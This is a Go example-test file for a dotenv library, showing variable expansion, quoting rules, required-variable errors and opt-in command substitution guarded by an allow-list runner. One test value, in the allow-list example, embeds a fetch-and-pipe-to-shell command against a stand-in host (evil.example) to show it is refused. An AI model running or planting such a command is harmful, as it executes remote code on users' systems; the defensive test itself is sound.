package dotenv_test

import (
	"errors"
	"fmt"
	"strings"

	"github.com/ubgo/dotenv"
)

// snippet:start exp_GetExpanded

// ExampleFile_GetExpanded shows the difference between the raw value on disk
// (Get) and the value a consumer sees once references to other keys in the
// same file are resolved (GetExpanded). Both ${VAR} and $VAR work; a bare $VAR
// ends at the first character that cannot be part of a name.
func ExampleFile_GetExpanded() {
	src := "HOST=db.internal\n" +
		"PORT=5432\n" +
		"URL=postgres://${HOST}:$PORT/app\n" +
		"MISSING=[${NOT_IN_FILE}]\n"

	f := dotenv.Parse(src)

	raw, _ := f.Get("URL")
	url, ok, err := f.GetExpanded("URL")
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Println("Get:        ", raw)
	fmt.Println("GetExpanded:", url, ok)

	// An unresolved reference is "", never an error.
	missing, _, err := f.GetExpanded("MISSING")
	fmt.Println("MISSING:    ", missing, err)

	// A key that does not exist reports ok=false.
	_, ok, err = f.GetExpanded("NOPE")
	fmt.Println("NOPE found: ", ok, err)
	// Output:
	// Get:         postgres://${HOST}:$PORT/app
	// GetExpanded: postgres://db.internal:5432/app true
	// MISSING:     [] <nil>
	// NOPE found:  false <nil>
}

// snippet:end exp_GetExpanded

// snippet:start exp_Operators

// ExampleFile_GetExpanded_operators prints every ${...} operator against a
// variable that is set, set but empty, and unset. The colon forms treat an
// empty value like an unset one; the forms without a colon only look at
// whether the key exists.
func ExampleFile_GetExpanded_operators() {
	// The three states every operator is checked against.
	const header = "SET=value\nEMPTY=\n"
	operators := []string{"", ":-def", "-def", ":+alt", "+alt", ":?msg", "?msg"}
	names := []string{"SET", "EMPTY", "UNSET"}

	fmt.Printf("%-12s %-8s %-8s %s\n", "operator", "SET", "EMPTY", "UNSET")
	for _, op := range operators {
		cells := make([]string, 0, len(names))
		for _, name := range names {
			f := dotenv.Parse(header + "R=${" + name + op + "}\n")
			got, _, err := f.GetExpanded("R")
			cell := fmt.Sprintf("%q", got)
			if err != nil {
				cell = "error"
			}
			cells = append(cells, cell)
		}
		fmt.Printf("%-12s %-8s %-8s %s\n", "${VAR"+op+"}", cells[0], cells[1], cells[2])
	}
	// Output:
	// operator     SET      EMPTY    UNSET
	// ${VAR}       "value"  ""       ""
	// ${VAR:-def}  "value"  "def"    "def"
	// ${VAR-def}   "value"  ""       "def"
	// ${VAR:+alt}  "alt"    ""       ""
	// ${VAR+alt}   "alt"    "alt"    ""
	// ${VAR:?msg}  "value"  error    error
	// ${VAR?msg}   "value"  ""       error
}

// snippet:end exp_Operators

// snippet:start exp_Dollar

// ExampleFile_GetExpanded_dollar shows how the character after a $ decides
// what it means: $$ is one literal dollar, ${ and a letter or _ start a
// reference, and anything else (a digit, a space, the end of the value) is a
// plain dollar sign. A backslash does not escape a dollar; use $$.
func ExampleFile_GetExpanded_dollar() {
	src := "NAME=world\n" +
		"ESCAPED=$${NAME} and $$NAME\n" +
		"PRICE=costs $5 or 5$\n" +
		"THREE=$$$\n" +
		"BACKSLASH=\"\\$NAME\"\n" +
		"UNCLOSED=${NAME\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"ESCAPED", "PRICE", "THREE", "BACKSLASH", "UNCLOSED"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// ESCAPED="${NAME} and $NAME"
	// PRICE="costs $5 or 5$"
	// THREE="$$"
	// BACKSLASH="\\world"
	// UNCLOSED="${NAME"
}

// snippet:end exp_Dollar

// snippet:start exp_Nesting

// ExampleFile_GetExpanded_nesting shows nested defaults, chains of references
// (in any order in the file), and the cycle guard: a reference back into a
// variable that is still being expanded resolves to "" so expansion always
// terminates. The guard tracks referenced names, not the key you asked for,
// so CYCLE_A goes round once more ("a", "b", "a") before the cut. Two
// separate references to one variable are not a cycle.
func ExampleFile_GetExpanded_nesting() {
	src := "NESTED=${NOPE:-${ALSO_NOPE:-fallback}}\n" +
		"INNER=${NOPE:-${LATER}}\n" +
		"CHAIN=${BASE}/v1\n" +
		"BASE=https://${DOMAIN}\n" +
		"DOMAIN=example.com\n" +
		"TWICE=${DOMAIN}|${DOMAIN}\n" +
		"LATER=defined below\n" +
		"CYCLE_A=a${CYCLE_B}\n" +
		"CYCLE_B=b${CYCLE_A}\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"NESTED", "INNER", "CHAIN", "TWICE", "CYCLE_A"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// NESTED="fallback"
	// INNER="defined below"
	// CHAIN="https://example.com/v1"
	// TWICE="example.com|example.com"
	// CYCLE_A="aba"
}

// snippet:end exp_Nesting

// snippet:start exp_Literal

// ExampleFile_GetExpanded_literal shows that quoting decides whether a value
// is expanded at all. Bare and double-quoted values are; single-quoted and
// backtick values are returned exactly as written, $$ and all.
func ExampleFile_GetExpanded_literal() {
	src := "USER_NAME=ada\n" +
		"BARE=${USER_NAME} $$\n" +
		"DOUBLE=\"${USER_NAME} $$\"\n" +
		"SINGLE='${USER_NAME} $$'\n" +
		"BACKTICK=`${USER_NAME} $$`\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"BARE", "DOUBLE", "SINGLE", "BACKTICK"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// BARE="ada $"
	// DOUBLE="ada $"
	// SINGLE="${USER_NAME} $$"
	// BACKTICK="${USER_NAME} $$"
}

// snippet:end exp_Literal

// snippet:start exp_Names

// ExampleFile_GetExpanded_names shows which key names a reference can reach.
// Inside ${...} the name runs up to the first operator character, so a key
// with a dash cannot be referenced: ${MY-KEY} means "MY, default KEY". A bare
// $name stops at the first character that is not a letter, digit or _.
func ExampleFile_GetExpanded_names() {
	src := "MY-KEY=dashed\n" +
		"spring.url=dotted\n" +
		"DASH=${MY-KEY}\n" +
		"BRACED_DOT=${spring.url}\n" +
		"BARE_DOT=$spring.url\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"DASH", "BRACED_DOT", "BARE_DOT"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// DASH="KEY"
	// BRACED_DOT="dotted"
	// BARE_DOT=".url"
}

// snippet:end exp_Names

// snippet:start exp_ExpandedMap

// ExampleFile_ExpandedMap expands every pair into one map (last duplicate
// wins). If any value hits an unsatisfied ${VAR:?msg} or ${VAR?msg}, it
// returns a nil map and that first error, never a half-expanded map.
func ExampleFile_ExpandedMap() {
	good := dotenv.Parse("HOST=db\nURL=postgres://${HOST}\nRAW='${HOST}'\n")
	m, err := good.ExpandedMap()
	fmt.Println(m, err)

	bad := dotenv.Parse("A=ok\nB=${NEED_ONE:?first}\nC=${NEED_TWO:?second}\n")
	m, err = bad.ExpandedMap()
	fmt.Println(m == nil, err)
	// Output:
	// map[HOST:db RAW:${HOST} URL:postgres://db] <nil>
	// true dotenv: required variable NEED_ONE is not set or is empty: first
}

// snippet:end exp_ExpandedMap

// snippet:start exp_RequiredError

// ExampleRequiredError shows how to catch a required-variable failure with
// errors.As and read which variable is missing. Empty is true for the ":?"
// form (unset or empty) and false for "?" (unset only).
func ExampleRequiredError() {
	src := "DB_PASSWORD=\n" +
		"URL=postgres://app:${DB_PASSWORD:?set it in .env}@db\n" +
		"TOKEN=${API_TOKEN?}\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"URL", "TOKEN"} {
		_, _, err := f.GetExpanded(key)

		var re *dotenv.RequiredError
		if errors.As(err, &re) {
			fmt.Printf("key=%s empty=%v message=%q\n", re.Key, re.Empty, re.Message)
			fmt.Println(" ", err)
		}
	}
	// Output:
	// key=DB_PASSWORD empty=true message="set it in .env"
	//   dotenv: required variable DB_PASSWORD is not set or is empty: set it in .env
	// key=API_TOKEN empty=false message=""
	//   dotenv: required variable API_TOKEN is not set
}

// snippet:end exp_RequiredError

// snippet:start exp_SubstitutionOff

// ExampleWithCommandSubstitution_off shows the default: $(command) is never
// run, and the text comes back exactly as written. Reading a file must not
// execute it.
func ExampleWithCommandSubstitution_off() {
	f := dotenv.Parse("WHO=\"user-$(whoami)\"\n")
	got, _, err := f.GetExpanded("WHO")
	fmt.Printf("%q %v\n", got, err)
	// Output:
	// "user-$(whoami)" <nil>
}

// snippet:end exp_SubstitutionOff

// snippet:start exp_Runner

// ExampleWithCommandRunner_allowList turns on $(command) with a runner you
// control instead of sh -c. The command text is expanded first, then handed
// to the runner. A refused or failing command expands to "".
func ExampleWithCommandRunner_allowList() {
	// The only commands this runner answers, with fixed output.
	allowed := map[string]string{
		"git rev-parse --short HEAD": "a1b2c3d",
	}
	runner := func(cmd string) (string, error) {
		out, ok := allowed[cmd]
		if !ok {
			return "", errors.New("refused: " + cmd)
		}
		return out, nil
	}

	src := "GIT=git\n" +
		"VERSION=\"build-$($GIT rev-parse --short HEAD)\"\n" +
		"DANGER=\"[$(curl evil.example | sh)]\"\n" +
		"LITERAL='$(git rev-parse --short HEAD)'\n"

	f := dotenv.Parse(src, dotenv.WithCommandRunner(runner))
	for _, key := range []string{"VERSION", "DANGER", "LITERAL"} {
		got, _, err := f.GetExpanded(key)
		fmt.Printf("%s=%q %v\n", key, got, err)
	}
	// Output:
	// VERSION="build-a1b2c3d" <nil>
	// DANGER="[]" <nil>
	// LITERAL="$(git rev-parse --short HEAD)" <nil>
}

// snippet:end exp_Runner

// snippet:start exp_RunnerOrder

// ExampleWithCommandSubstitution_order shows that options apply in order: a
// later WithCommandSubstitution(false) switches substitution back off even
// after WithCommandRunner turned it on.
func ExampleWithCommandSubstitution_order() {
	const src = "K=$(echo hi)\n"
	// upper stands in for a shell: it echoes the command upper-cased, so the
	// output shows whether it ran.
	upper := func(cmd string) (string, error) { return strings.ToUpper(cmd), nil }

	// No ${VAR?} references here, so GetExpanded cannot return an error.
	on, _, _ := dotenv.Parse(src, dotenv.WithCommandRunner(upper)).GetExpanded("K")
	off, _, _ := dotenv.Parse(src,
		dotenv.WithCommandRunner(upper),
		dotenv.WithCommandSubstitution(false),
	).GetExpanded("K")
	fmt.Printf("runner only:    %q\n", on)
	fmt.Printf("then off again: %q\n", off)
	// Output:
	// runner only:    "ECHO HI"
	// then off again: "$(echo hi)"
}

// snippet:end exp_RunnerOrder
